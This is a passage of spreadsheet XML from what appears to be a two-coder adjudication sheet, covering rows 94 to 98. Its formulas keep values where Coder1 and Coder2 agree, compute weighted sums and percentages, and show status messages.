        <f>IF(AND(Coder1!N94&amp;""&lt;&gt;"",Coder1!N94&amp;""=Coder2!N94&amp;""),Coder1!N94,"")</f>
        <v/>
      </c>
      <c r="O94" s="14">
        <f>IF(AND(Coder1!O94&amp;""&lt;&gt;"",Coder1!O94&amp;""=Coder2!O94&amp;""),Coder1!O94,"")</f>
        <v/>
      </c>
      <c r="P94" s="14">
        <f>IF(AND(Coder1!P94&amp;""&lt;&gt;"",Coder1!P94&amp;""=Coder2!P94&amp;""),Coder1!P94,"")</f>
        <v/>
      </c>
      <c r="Q94" s="14">
        <f>IF(AND(Coder1!Q94&amp;""&lt;&gt;"",Coder1!Q94&amp;""=Coder2!Q94&amp;""),Coder1!Q94,"")</f>
        <v/>
      </c>
      <c r="R94" s="14">
        <f>IF(AND(Coder1!R94&amp;""&lt;&gt;"",Coder1!R94&amp;""=Coder2!R94&amp;""),Coder1!R94,"")</f>
        <v/>
      </c>
      <c r="S94" s="14">
        <f>IF(AND(Coder1!S94&amp;""&lt;&gt;"",Coder1!S94&amp;""=Coder2!S94&amp;""),Coder1!S94,"")</f>
        <v/>
      </c>
      <c r="T94" s="14">
        <f>IF(AND(Coder1!T94&amp;""&lt;&gt;"",Coder1!T94&amp;""=Coder2!T94&amp;""),Coder1!T94,"")</f>
        <v/>
      </c>
      <c r="U94" s="14">
        <f>IF(AND(Coder1!U94&amp;""&lt;&gt;"",Coder1!U94&amp;""=Coder2!U94&amp;""),Coder1!U94,"")</f>
        <v/>
      </c>
      <c r="V94" s="14">
        <f>IF(AND(Coder1!V94&amp;""&lt;&gt;"",Coder1!V94&amp;""=Coder2!V94&amp;""),Coder1!V94,"")</f>
        <v/>
      </c>
      <c r="W94" s="14">
        <f>IF(AND(Coder1!W94&amp;""&lt;&gt;"",Coder1!W94&amp;""=Coder2!W94&amp;""),Coder1!W94,"")</f>
        <v/>
      </c>
      <c r="X94" s="14">
        <f>IF(AND(Coder1!X94&amp;""&lt;&gt;"",Coder1!X94&amp;""=Coder2!X94&amp;""),Coder1!X94,"")</f>
        <v/>
      </c>
      <c r="Y94" s="14">
        <f>IF(AND(Coder1!Y94&amp;""&lt;&gt;"",Coder1!Y94&amp;""=Coder2!Y94&amp;""),Coder1!Y94,"")</f>
        <v/>
      </c>
      <c r="Z94" s="14">
        <f>IF(AND(Coder1!Z94&amp;""&lt;&gt;"",Coder1!Z94&amp;""=Coder2!Z94&amp;""),Coder1!Z94,"")</f>
        <v/>
      </c>
      <c r="AA94" s="14">
        <f>IF(AND(Coder1!AA94&amp;""&lt;&gt;"",Coder1!AA94&amp;""=Coder2!AA94&amp;""),Coder1!AA94,"")</f>
        <v/>
      </c>
      <c r="AB94" s="14">
        <f>IF(AND(Coder1!AB94&amp;""&lt;&gt;"",Coder1!AB94&amp;""=Coder2!AB94&amp;""),Coder1!AB94,"")</f>
        <v/>
      </c>
      <c r="AC94" s="14">
        <f>IF(AND(Coder1!AC94&amp;""&lt;&gt;"",Coder1!AC94&amp;""=Coder2!AC94&amp;""),Coder1!AC94,"")</f>
        <v/>
      </c>
      <c r="AD94" s="14">
        <f>IF(AND(Coder1!AD94&amp;""&lt;&gt;"",Coder1!AD94&amp;""=Coder2!AD94&amp;""),Coder1!AD94,"")</f>
        <v/>
      </c>
      <c r="AE94" s="14">
        <f>IF(AND(Coder1!AE94&amp;""&lt;&gt;"",Coder1!AE94&amp;""=Coder2!AE94&amp;""),Coder1!AE94,"")</f>
        <v/>
      </c>
      <c r="AF94" s="14">
        <f>IF(AND(Coder1!AF94&amp;""&lt;&gt;"",Coder1!AF94&amp;""=Coder2!AF94&amp;""),Coder1!AF94,"")</f>
        <v/>
      </c>
      <c r="AG94" s="14">
        <f>IF(AND(Coder1!AG94&amp;""&lt;&gt;"",Coder1!AG94&amp;""=Coder2!AG94&amp;""),Coder1!AG94,"")</f>
        <v/>
      </c>
      <c r="AH94" s="14">
        <f>IF(AND(Coder1!AH94&amp;""&lt;&gt;"",Coder1!AH94&amp;""=Coder2!AH94&amp;""),Coder1!AH94,"")</f>
        <v/>
      </c>
      <c r="AI94" s="11">
        <f>IF(COUNT(E94:L94)=0,"",SUM(E94:L94))</f>
        <v/>
      </c>
      <c r="AJ94" s="11">
        <f>IF(AI94="","",N(E94)*3+N(F94)*2+N(G94)*2+N(H94)*2+N(I94)*2+N(J94)*3+N(K94)*3+N(L94)*3)</f>
        <v/>
      </c>
      <c r="AK94" s="11">
        <f>IF(AI94="","",COUNTIF(N94:AG94,1))</f>
        <v/>
      </c>
      <c r="AL94" s="11">
        <f>IF(OR(AJ94="",AJ94=0),"",ROUND(100*(AJ94-AK94)/AJ94,1))</f>
        <v/>
      </c>
      <c r="AM94" s="11">
        <f>IF(AND(Coder1!AN94=1,Coder2!AN94=1),IF(COUNTBLANK(E94:AH94)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN94" s="11">
        <f>IF(AND(Coder1!AN94=1,Coder2!AN94=1),IF(SUMPRODUCT(--(Coder1!E94:AH94&amp;""&lt;&gt;Coder2!E94:AH94&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO94" s="11" t="n"/>
    </row>
    <row r="95">
      <c r="A95" s="11">
        <f>Coder1!A95</f>
        <v/>
      </c>
      <c r="B95" s="11">
        <f>Coder1!B95</f>
        <v/>
      </c>
      <c r="C95" s="11">
        <f>Coder1!C95</f>
        <v/>
      </c>
      <c r="D95" s="11">
        <f>Coder1!D95</f>
        <v/>
      </c>
      <c r="E95" s="14">
        <f>IF(AND(Coder1!E95&amp;""&lt;&gt;"",Coder1!E95&amp;""=Coder2!E95&amp;""),Coder1!E95,"")</f>
        <v/>
      </c>
      <c r="F95" s="14">
        <f>IF(AND(Coder1!F95&amp;""&lt;&gt;"",Coder1!F95&amp;""=Coder2!F95&amp;""),Coder1!F95,"")</f>
        <v/>
      </c>
      <c r="G95" s="14">
        <f>IF(AND(Coder1!G95&amp;""&lt;&gt;"",Coder1!G95&amp;""=Coder2!G95&amp;""),Coder1!G95,"")</f>
        <v/>
      </c>
      <c r="H95" s="14">
        <f>IF(AND(Coder1!H95&amp;""&lt;&gt;"",Coder1!H95&amp;""=Coder2!H95&amp;""),Coder1!H95,"")</f>
        <v/>
      </c>
      <c r="I95" s="14">
        <f>IF(AND(Coder1!I95&amp;""&lt;&gt;"",Coder1!I95&amp;""=Coder2!I95&amp;""),Coder1!I95,"")</f>
        <v/>
      </c>
      <c r="J95" s="14">
        <f>IF(AND(Coder1!J95&amp;""&lt;&gt;"",Coder1!J95&amp;""=Coder2!J95&amp;""),Coder1!J95,"")</f>
        <v/>
      </c>
      <c r="K95" s="14">
        <f>IF(AND(Coder1!K95&amp;""&lt;&gt;"",Coder1!K95&amp;""=Coder2!K95&amp;""),Coder1!K95,"")</f>
        <v/>
      </c>
      <c r="L95" s="14">
        <f>IF(AND(Coder1!L95&amp;""&lt;&gt;"",Coder1!L95&amp;""=Coder2!L95&amp;""),Coder1!L95,"")</f>
        <v/>
      </c>
      <c r="M95" s="14">
        <f>IF(AND(Coder1!M95&amp;""&lt;&gt;"",Coder1!M95&amp;""=Coder2!M95&amp;""),Coder1!M95,"")</f>
        <v/>
      </c>
      <c r="N95" s="14">
        <f>IF(AND(Coder1!N95&amp;""&lt;&gt;"",Coder1!N95&amp;""=Coder2!N95&amp;""),Coder1!N95,"")</f>
        <v/>
      </c>
      <c r="O95" s="14">
        <f>IF(AND(Coder1!O95&amp;""&lt;&gt;"",Coder1!O95&amp;""=Coder2!O95&amp;""),Coder1!O95,"")</f>
        <v/>
      </c>
      <c r="P95" s="14">
        <f>IF(AND(Coder1!P95&amp;""&lt;&gt;"",Coder1!P95&amp;""=Coder2!P95&amp;""),Coder1!P95,"")</f>
        <v/>
      </c>
      <c r="Q95" s="14">
        <f>IF(AND(Coder1!Q95&amp;""&lt;&gt;"",Coder1!Q95&amp;""=Coder2!Q95&amp;""),Coder1!Q95,"")</f>
        <v/>
      </c>
      <c r="R95" s="14">
        <f>IF(AND(Coder1!R95&amp;""&lt;&gt;"",Coder1!R95&amp;""=Coder2!R95&amp;""),Coder1!R95,"")</f>
        <v/>
      </c>
      <c r="S95" s="14">
        <f>IF(AND(Coder1!S95&amp;""&lt;&gt;"",Coder1!S95&amp;""=Coder2!S95&amp;""),Coder1!S95,"")</f>
        <v/>
      </c>
      <c r="T95" s="14">
        <f>IF(AND(Coder1!T95&amp;""&lt;&gt;"",Coder1!T95&amp;""=Coder2!T95&amp;""),Coder1!T95,"")</f>
        <v/>
      </c>
      <c r="U95" s="14">
        <f>IF(AND(Coder1!U95&amp;""&lt;&gt;"",Coder1!U95&amp;""=Coder2!U95&amp;""),Coder1!U95,"")</f>
        <v/>
      </c>
      <c r="V95" s="14">
        <f>IF(AND(Coder1!V95&amp;""&lt;&gt;"",Coder1!V95&amp;""=Coder2!V95&amp;""),Coder1!V95,"")</f>
        <v/>
      </c>
      <c r="W95" s="14">
        <f>IF(AND(Coder1!W95&amp;""&lt;&gt;"",Coder1!W95&amp;""=Coder2!W95&amp;""),Coder1!W95,"")</f>
        <v/>
      </c>
      <c r="X95" s="14">
        <f>IF(AND(Coder1!X95&amp;""&lt;&gt;"",Coder1!X95&amp;""=Coder2!X95&amp;""),Coder1!X95,"")</f>
        <v/>
      </c>
      <c r="Y95" s="14">
        <f>IF(AND(Coder1!Y95&amp;""&lt;&gt;"",Coder1!Y95&amp;""=Coder2!Y95&amp;""),Coder1!Y95,"")</f>
        <v/>
      </c>
      <c r="Z95" s="14">
        <f>IF(AND(Coder1!Z95&amp;""&lt;&gt;"",Coder1!Z95&amp;""=Coder2!Z95&amp;""),Coder1!Z95,"")</f>
        <v/>
      </c>
      <c r="AA95" s="14">
        <f>IF(AND(Coder1!AA95&amp;""&lt;&gt;"",Coder1!AA95&amp;""=Coder2!AA95&amp;""),Coder1!AA95,"")</f>
        <v/>
      </c>
      <c r="AB95" s="14">
        <f>IF(AND(Coder1!AB95&amp;""&lt;&gt;"",Coder1!AB95&amp;""=Coder2!AB95&amp;""),Coder1!AB95,"")</f>
        <v/>
      </c>
      <c r="AC95" s="14">
        <f>IF(AND(Coder1!AC95&amp;""&lt;&gt;"",Coder1!AC95&amp;""=Coder2!AC95&amp;""),Coder1!AC95,"")</f>
        <v/>
      </c>
      <c r="AD95" s="14">
        <f>IF(AND(Coder1!AD95&amp;""&lt;&gt;"",Coder1!AD95&amp;""=Coder2!AD95&amp;""),Coder1!AD95,"")</f>
        <v/>
      </c>
      <c r="AE95" s="14">
        <f>IF(AND(Coder1!AE95&amp;""&lt;&gt;"",Coder1!AE95&amp;""=Coder2!AE95&amp;""),Coder1!AE95,"")</f>
        <v/>
      </c>
      <c r="AF95" s="14">
        <f>IF(AND(Coder1!AF95&amp;""&lt;&gt;"",Coder1!AF95&amp;""=Coder2!AF95&amp;""),Coder1!AF95,"")</f>
        <v/>
      </c>
      <c r="AG95" s="14">
        <f>IF(AND(Coder1!AG95&amp;""&lt;&gt;"",Coder1!AG95&amp;""=Coder2!AG95&amp;""),Coder1!AG95,"")</f>
        <v/>
      </c>
      <c r="AH95" s="14">
        <f>IF(AND(Coder1!AH95&amp;""&lt;&gt;"",Coder1!AH95&amp;""=Coder2!AH95&amp;""),Coder1!AH95,"")</f>
        <v/>
      </c>
      <c r="AI95" s="11">
        <f>IF(COUNT(E95:L95)=0,"",SUM(E95:L95))</f>
        <v/>
      </c>
      <c r="AJ95" s="11">
        <f>IF(AI95="","",N(E95)*3+N(F95)*2+N(G95)*2+N(H95)*2+N(I95)*2+N(J95)*3+N(K95)*3+N(L95)*3)</f>
        <v/>
      </c>
      <c r="AK95" s="11">
        <f>IF(AI95="","",COUNTIF(N95:AG95,1))</f>
        <v/>
      </c>
      <c r="AL95" s="11">
        <f>IF(OR(AJ95="",AJ95=0),"",ROUND(100*(AJ95-AK95)/AJ95,1))</f>
        <v/>
      </c>
      <c r="AM95" s="11">
        <f>IF(AND(Coder1!AN95=1,Coder2!AN95=1),IF(COUNTBLANK(E95:AH95)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN95" s="11">
        <f>IF(AND(Coder1!AN95=1,Coder2!AN95=1),IF(SUMPRODUCT(--(Coder1!E95:AH95&amp;""&lt;&gt;Coder2!E95:AH95&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO95" s="11" t="n"/>
    </row>
    <row r="96">
      <c r="A96" s="11">
        <f>Coder1!A96</f>
        <v/>
      </c>
      <c r="B96" s="11">
        <f>Coder1!B96</f>
        <v/>
      </c>
      <c r="C96" s="11">
        <f>Coder1!C96</f>
        <v/>
      </c>
      <c r="D96" s="11">
        <f>Coder1!D96</f>
        <v/>
      </c>
      <c r="E96" s="14">
        <f>IF(AND(Coder1!E96&amp;""&lt;&gt;"",Coder1!E96&amp;""=Coder2!E96&amp;""),Coder1!E96,"")</f>
        <v/>
      </c>
      <c r="F96" s="14">
        <f>IF(AND(Coder1!F96&amp;""&lt;&gt;"",Coder1!F96&amp;""=Coder2!F96&amp;""),Coder1!F96,"")</f>
        <v/>
      </c>
      <c r="G96" s="14">
        <f>IF(AND(Coder1!G96&amp;""&lt;&gt;"",Coder1!G96&amp;""=Coder2!G96&amp;""),Coder1!G96,"")</f>
        <v/>
      </c>
      <c r="H96" s="14">
        <f>IF(AND(Coder1!H96&amp;""&lt;&gt;"",Coder1!H96&amp;""=Coder2!H96&amp;""),Coder1!H96,"")</f>
        <v/>
      </c>
      <c r="I96" s="14">
        <f>IF(AND(Coder1!I96&amp;""&lt;&gt;"",Coder1!I96&amp;""=Coder2!I96&amp;""),Coder1!I96,"")</f>
        <v/>
      </c>
      <c r="J96" s="14">
        <f>IF(AND(Coder1!J96&amp;""&lt;&gt;"",Coder1!J96&amp;""=Coder2!J96&amp;""),Coder1!J96,"")</f>
        <v/>
      </c>
      <c r="K96" s="14">
        <f>IF(AND(Coder1!K96&amp;""&lt;&gt;"",Coder1!K96&amp;""=Coder2!K96&amp;""),Coder1!K96,"")</f>
        <v/>
      </c>
      <c r="L96" s="14">
        <f>IF(AND(Coder1!L96&amp;""&lt;&gt;"",Coder1!L96&amp;""=Coder2!L96&amp;""),Coder1!L96,"")</f>
        <v/>
      </c>
      <c r="M96" s="14">
        <f>IF(AND(Coder1!M96&amp;""&lt;&gt;"",Coder1!M96&amp;""=Coder2!M96&amp;""),Coder1!M96,"")</f>
        <v/>
      </c>
      <c r="N96" s="14">
        <f>IF(AND(Coder1!N96&amp;""&lt;&gt;"",Coder1!N96&amp;""=Coder2!N96&amp;""),Coder1!N96,"")</f>
        <v/>
      </c>
      <c r="O96" s="14">
        <f>IF(AND(Coder1!O96&amp;""&lt;&gt;"",Coder1!O96&amp;""=Coder2!O96&amp;""),Coder1!O96,"")</f>
        <v/>
      </c>
      <c r="P96" s="14">
        <f>IF(AND(Coder1!P96&amp;""&lt;&gt;"",Coder1!P96&amp;""=Coder2!P96&amp;""),Coder1!P96,"")</f>
        <v/>
      </c>
      <c r="Q96" s="14">
        <f>IF(AND(Coder1!Q96&amp;""&lt;&gt;"",Coder1!Q96&amp;""=Coder2!Q96&amp;""),Coder1!Q96,"")</f>
        <v/>
      </c>
      <c r="R96" s="14">
        <f>IF(AND(Coder1!R96&amp;""&lt;&gt;"",Coder1!R96&amp;""=Coder2!R96&amp;""),Coder1!R96,"")</f>
        <v/>
      </c>
      <c r="S96" s="14">
        <f>IF(AND(Coder1!S96&amp;""&lt;&gt;"",Coder1!S96&amp;""=Coder2!S96&amp;""),Coder1!S96,"")</f>
        <v/>
      </c>
      <c r="T96" s="14">
        <f>IF(AND(Coder1!T96&amp;""&lt;&gt;"",Coder1!T96&amp;""=Coder2!T96&amp;""),Coder1!T96,"")</f>
        <v/>
      </c>
      <c r="U96" s="14">
        <f>IF(AND(Coder1!U96&amp;""&lt;&gt;"",Coder1!U96&amp;""=Coder2!U96&amp;""),Coder1!U96,"")</f>
        <v/>
      </c>
      <c r="V96" s="14">
        <f>IF(AND(Coder1!V96&amp;""&lt;&gt;"",Coder1!V96&amp;""=Coder2!V96&amp;""),Coder1!V96,"")</f>
        <v/>
      </c>
      <c r="W96" s="14">
        <f>IF(AND(Coder1!W96&amp;""&lt;&gt;"",Coder1!W96&amp;""=Coder2!W96&amp;""),Coder1!W96,"")</f>
        <v/>
      </c>
      <c r="X96" s="14">
        <f>IF(AND(Coder1!X96&amp;""&lt;&gt;"",Coder1!X96&amp;""=Coder2!X96&amp;""),Coder1!X96,"")</f>
        <v/>
      </c>
      <c r="Y96" s="14">
        <f>IF(AND(Coder1!Y96&amp;""&lt;&gt;"",Coder1!Y96&amp;""=Coder2!Y96&amp;""),Coder1!Y96,"")</f>
        <v/>
      </c>
      <c r="Z96" s="14">
        <f>IF(AND(Coder1!Z96&amp;""&lt;&gt;"",Coder1!Z96&amp;""=Coder2!Z96&amp;""),Coder1!Z96,"")</f>
        <v/>
      </c>
      <c r="AA96" s="14">
        <f>IF(AND(Coder1!AA96&amp;""&lt;&gt;"",Coder1!AA96&amp;""=Coder2!AA96&amp;""),Coder1!AA96,"")</f>
        <v/>
      </c>
      <c r="AB96" s="14">
        <f>IF(AND(Coder1!AB96&amp;""&lt;&gt;"",Coder1!AB96&amp;""=Coder2!AB96&amp;""),Coder1!AB96,"")</f>
        <v/>
      </c>
      <c r="AC96" s="14">
        <f>IF(AND(Coder1!AC96&amp;""&lt;&gt;"",Coder1!AC96&amp;""=Coder2!AC96&amp;""),Coder1!AC96,"")</f>
        <v/>
      </c>
      <c r="AD96" s="14">
        <f>IF(AND(Coder1!AD96&amp;""&lt;&gt;"",Coder1!AD96&amp;""=Coder2!AD96&amp;""),Coder1!AD96,"")</f>
        <v/>
      </c>
      <c r="AE96" s="14">
        <f>IF(AND(Coder1!AE96&amp;""&lt;&gt;"",Coder1!AE96&amp;""=Coder2!AE96&amp;""),Coder1!AE96,"")</f>
        <v/>
      </c>
      <c r="AF96" s="14">
        <f>IF(AND(Coder1!AF96&amp;""&lt;&gt;"",Coder1!AF96&amp;""=Coder2!AF96&amp;""),Coder1!AF96,"")</f>
        <v/>
      </c>
      <c r="AG96" s="14">
        <f>IF(AND(Coder1!AG96&amp;""&lt;&gt;"",Coder1!AG96&amp;""=Coder2!AG96&amp;""),Coder1!AG96,"")</f>
        <v/>
      </c>
      <c r="AH96" s="14">
        <f>IF(AND(Coder1!AH96&amp;""&lt;&gt;"",Coder1!AH96&amp;""=Coder2!AH96&amp;""),Coder1!AH96,"")</f>
        <v/>
      </c>
      <c r="AI96" s="11">
        <f>IF(COUNT(E96:L96)=0,"",SUM(E96:L96))</f>
        <v/>
      </c>
      <c r="AJ96" s="11">
        <f>IF(AI96="","",N(E96)*3+N(F96)*2+N(G96)*2+N(H96)*2+N(I96)*2+N(J96)*3+N(K96)*3+N(L96)*3)</f>
        <v/>
      </c>
      <c r="AK96" s="11">
        <f>IF(AI96="","",COUNTIF(N96:AG96,1))</f>
        <v/>
      </c>
      <c r="AL96" s="11">
        <f>IF(OR(AJ96="",AJ96=0),"",ROUND(100*(AJ96-AK96)/AJ96,1))</f>
        <v/>
      </c>
      <c r="AM96" s="11">
        <f>IF(AND(Coder1!AN96=1,Coder2!AN96=1),IF(COUNTBLANK(E96:AH96)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN96" s="11">
        <f>IF(AND(Coder1!AN96=1,Coder2!AN96=1),IF(SUMPRODUCT(--(Coder1!E96:AH96&amp;""&lt;&gt;Coder2!E96:AH96&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO96" s="11" t="n"/>
    </row>
    <row r="97">
      <c r="A97" s="11">
        <f>Coder1!A97</f>
        <v/>
      </c>
      <c r="B97" s="11">
        <f>Coder1!B97</f>
        <v/>
      </c>
      <c r="C97" s="11">
        <f>Coder1!C97</f>
        <v/>
      </c>
      <c r="D97" s="11">
        <f>Coder1!D97</f>
        <v/>
      </c>
      <c r="E97" s="14">
        <f>IF(AND(Coder1!E97&amp;""&lt;&gt;"",Coder1!E97&amp;""=Coder2!E97&amp;""),Coder1!E97,"")</f>
        <v/>
      </c>
      <c r="F97" s="14">
        <f>IF(AND(Coder1!F97&amp;""&lt;&gt;"",Coder1!F97&amp;""=Coder2!F97&amp;""),Coder1!F97,"")</f>
        <v/>
      </c>
      <c r="G97" s="14">
        <f>IF(AND(Coder1!G97&amp;""&lt;&gt;"",Coder1!G97&amp;""=Coder2!G97&amp;""),Coder1!G97,"")</f>
        <v/>
      </c>
      <c r="H97" s="14">
        <f>IF(AND(Coder1!H97&amp;""&lt;&gt;"",Coder1!H97&amp;""=Coder2!H97&amp;""),Coder1!H97,"")</f>
        <v/>
      </c>
      <c r="I97" s="14">
        <f>IF(AND(Coder1!I97&amp;""&lt;&gt;"",Coder1!I97&amp;""=Coder2!I97&amp;""),Coder1!I97,"")</f>
        <v/>
      </c>
      <c r="J97" s="14">
        <f>IF(AND(Coder1!J97&amp;""&lt;&gt;"",Coder1!J97&amp;""=Coder2!J97&amp;""),Coder1!J97,"")</f>
        <v/>
      </c>
      <c r="K97" s="14">
        <f>IF(AND(Coder1!K97&amp;""&lt;&gt;"",Coder1!K97&amp;""=Coder2!K97&amp;""),Coder1!K97,"")</f>
        <v/>
      </c>
      <c r="L97" s="14">
        <f>IF(AND(Coder1!L97&amp;""&lt;&gt;"",Coder1!L97&amp;""=Coder2!L97&amp;""),Coder1!L97,"")</f>
        <v/>
      </c>
      <c r="M97" s="14">
        <f>IF(AND(Coder1!M97&amp;""&lt;&gt;"",Coder1!M97&amp;""=Coder2!M97&amp;""),Coder1!M97,"")</f>
        <v/>
      </c>
      <c r="N97" s="14">
        <f>IF(AND(Coder1!N97&amp;""&lt;&gt;"",Coder1!N97&amp;""=Coder2!N97&amp;""),Coder1!N97,"")</f>
        <v/>
      </c>
      <c r="O97" s="14">
        <f>IF(AND(Coder1!O97&amp;""&lt;&gt;"",Coder1!O97&amp;""=Coder2!O97&amp;""),Coder1!O97,"")</f>
        <v/>
      </c>
      <c r="P97" s="14">
        <f>IF(AND(Coder1!P97&amp;""&lt;&gt;"",Coder1!P97&amp;""=Coder2!P97&amp;""),Coder1!P97,"")</f>
        <v/>
      </c>
      <c r="Q97" s="14">
        <f>IF(AND(Coder1!Q97&amp;""&lt;&gt;"",Coder1!Q97&amp;""=Coder2!Q97&amp;""),Coder1!Q97,"")</f>
        <v/>
      </c>
      <c r="R97" s="14">
        <f>IF(AND(Coder1!R97&amp;""&lt;&gt;"",Coder1!R97&amp;""=Coder2!R97&amp;""),Coder1!R97,"")</f>
        <v/>
      </c>
      <c r="S97" s="14">
        <f>IF(AND(Coder1!S97&amp;""&lt;&gt;"",Coder1!S97&amp;""=Coder2!S97&amp;""),Coder1!S97,"")</f>
        <v/>
      </c>
      <c r="T97" s="14">
        <f>IF(AND(Coder1!T97&amp;""&lt;&gt;"",Coder1!T97&amp;""=Coder2!T97&amp;""),Coder1!T97,"")</f>
        <v/>
      </c>
      <c r="U97" s="14">
        <f>IF(AND(Coder1!U97&amp;""&lt;&gt;"",Coder1!U97&amp;""=Coder2!U97&amp;""),Coder1!U97,"")</f>
        <v/>
      </c>
      <c r="V97" s="14">
        <f>IF(AND(Coder1!V97&amp;""&lt;&gt;"",Coder1!V97&amp;""=Coder2!V97&amp;""),Coder1!V97,"")</f>
        <v/>
      </c>
      <c r="W97" s="14">
        <f>IF(AND(Coder1!W97&amp;""&lt;&gt;"",Coder1!W97&amp;""=Coder2!W97&amp;""),Coder1!W97,"")</f>
        <v/>
      </c>
      <c r="X97" s="14">
        <f>IF(AND(Coder1!X97&amp;""&lt;&gt;"",Coder1!X97&amp;""=Coder2!X97&amp;""),Coder1!X97,"")</f>
        <v/>
      </c>
      <c r="Y97" s="14">
        <f>IF(AND(Coder1!Y97&amp;""&lt;&gt;"",Coder1!Y97&amp;""=Coder2!Y97&amp;""),Coder1!Y97,"")</f>
        <v/>
      </c>
      <c r="Z97" s="14">
        <f>IF(AND(Coder1!Z97&amp;""&lt;&gt;"",Coder1!Z97&amp;""=Coder2!Z97&amp;""),Coder1!Z97,"")</f>
        <v/>
      </c>
      <c r="AA97" s="14">
        <f>IF(AND(Coder1!AA97&amp;""&lt;&gt;"",Coder1!AA97&amp;""=Coder2!AA97&amp;""),Coder1!AA97,"")</f>
        <v/>
      </c>
      <c r="AB97" s="14">
        <f>IF(AND(Coder1!AB97&amp;""&lt;&gt;"",Coder1!AB97&amp;""=Coder2!AB97&amp;""),Coder1!AB97,"")</f>
        <v/>
      </c>
      <c r="AC97" s="14">
        <f>IF(AND(Coder1!AC97&amp;""&lt;&gt;"",Coder1!AC97&amp;""=Coder2!AC97&amp;""),Coder1!AC97,"")</f>
        <v/>
      </c>
      <c r="AD97" s="14">
        <f>IF(AND(Coder1!AD97&amp;""&lt;&gt;"",Coder1!AD97&amp;""=Coder2!AD97&amp;""),Coder1!AD97,"")</f>
        <v/>
      </c>
      <c r="AE97" s="14">
        <f>IF(AND(Coder1!AE97&amp;""&lt;&gt;"",Coder1!AE97&amp;""=Coder2!AE97&amp;""),Coder1!AE97,"")</f>
        <v/>
      </c>
      <c r="AF97" s="14">
        <f>IF(AND(Coder1!AF97&amp;""&lt;&gt;"",Coder1!AF97&amp;""=Coder2!AF97&amp;""),Coder1!AF97,"")</f>
        <v/>
      </c>
      <c r="AG97" s="14">
        <f>IF(AND(Coder1!AG97&amp;""&lt;&gt;"",Coder1!AG97&amp;""=Coder2!AG97&amp;""),Coder1!AG97,"")</f>
        <v/>
      </c>
      <c r="AH97" s="14">
        <f>IF(AND(Coder1!AH97&amp;""&lt;&gt;"",Coder1!AH97&amp;""=Coder2!AH97&amp;""),Coder1!AH97,"")</f>
        <v/>
      </c>
      <c r="AI97" s="11">
        <f>IF(COUNT(E97:L97)=0,"",SUM(E97:L97))</f>
        <v/>
      </c>
      <c r="AJ97" s="11">
        <f>IF(AI97="","",N(E97)*3+N(F97)*2+N(G97)*2+N(H97)*2+N(I97)*2+N(J97)*3+N(K97)*3+N(L97)*3)</f>
        <v/>
      </c>
      <c r="AK97" s="11">
        <f>IF(AI97="","",COUNTIF(N97:AG97,1))</f>
        <v/>
      </c>
      <c r="AL97" s="11">
        <f>IF(OR(AJ97="",AJ97=0),"",ROUND(100*(AJ97-AK97)/AJ97,1))</f>
        <v/>
      </c>
      <c r="AM97" s="11">
        <f>IF(AND(Coder1!AN97=1,Coder2!AN97=1),IF(COUNTBLANK(E97:AH97)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN97" s="11">
        <f>IF(AND(Coder1!AN97=1,Coder2!AN97=1),IF(SUMPRODUCT(--(Coder1!E97:AH97&amp;""&lt;&gt;Coder2!E97:AH97&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO97" s="11" t="n"/>
    </row>
    <row r="98">
      <c r="A98" s="11">
        <f>Coder1!A98</f>
        <v/>
      </c>
      <c r="B98" s="11">
        <f>Coder1!B98</f>
        <v/>
      </c>
      <c r="C98" s="11">
        <f>Coder1!C98</f>
        <v/>
      </c>
      <c r="D98" s="11">
        <f>Coder1!D98</f>
        <v/>
      </c>
      <c r="E98" s="14">
        <f>IF(AND(Coder1!E98&amp;""&lt;&gt;"",Coder1!E98&amp;""=Coder2!E98&amp;""),Coder1!E98,"")</f>
        <v/>
      </c>
      <c r="F98" s="14">
        <f>IF(AND(Coder1!F98&amp;""&lt;&gt;"",Coder1!F98&amp;""=Coder2!F98&amp;""),Coder1!F98,"")</f>
        <v/>
      </c>
      <c r="G98" s="14">
        <f>IF(AND(Coder1!G98&amp;""&lt;&gt;"",Coder1!G98&amp;""=Coder2!G98&amp;""),Coder1!G98,"")</f>
        <v/>
      </c>
      <c r="H98" s="14">
        <f>IF(AND(Coder1!H98&amp;""&lt;&gt;"",Coder1!H98&amp;""=Coder2!H98&amp;""),Coder1!H98,"")</f>
        <v/>
      </c>
      <c r="I98" s="14">
        <f>IF(AND(Coder1!I98&amp;""&lt;&gt;"",Coder1!I98&amp;""=Coder2!I98&amp;""),Coder1!I98,"")</f>
        <v/>
      </c>
      <c r="J98" s="14">
        <f>IF(AND(Coder1!J98&amp;""&lt;&gt;"",Coder1!J98&amp;""=Coder2!J98&amp;""),Coder1!J98,"")</f>
        <v/>
      </c>
      <c r="K98" s="14">
        <f>IF(AND(Coder1!K98&amp;""&lt;&gt;"",Coder1!K98&amp;""=Coder2!K98&amp;""),Coder1!K98,"")</f>
        <v/>
      </c>
      <c r="L98" s="14">
        <f>IF(AND(Coder1!L98&amp;""&lt;&gt;"",Coder1!L98&amp;""=Coder2!L98&amp;""),Coder1!L98,"")</f>
        <v/>
      </c>
      <c r="M98" s="14">
        <f>IF(AND(Coder1!M98&amp;""&lt;&gt;"",Coder1!M98&amp;""=Coder2!M98&amp;""),Coder1!M98,"")</f>
        <v/>
      </c>
      <c r="N98" s="14">
        <f>IF(AND(Coder1!N98&amp;""&lt;&gt;"",Coder1!N98&amp;""=Coder2!N98&amp;""),Coder1!N98,"")</f>
        <v/>
      </c>
      <c r="O98" s="14">
        <f>IF(AND(Coder1!O98&amp;""&lt;&gt;"",Coder1!O98&amp;""=Coder2!O98&amp;""),Coder1!O98,"")</f>
        <v/>
      </c>
      <c r="P98" s="14">
        <f>IF(AND(Coder1!P98&amp;""&lt;&gt;"",Coder1!P98&amp;""=Coder2!P98&amp;""),Coder1!P98,"")</f>
        <v/>
      </c>
      <c r="Q98" s="14">
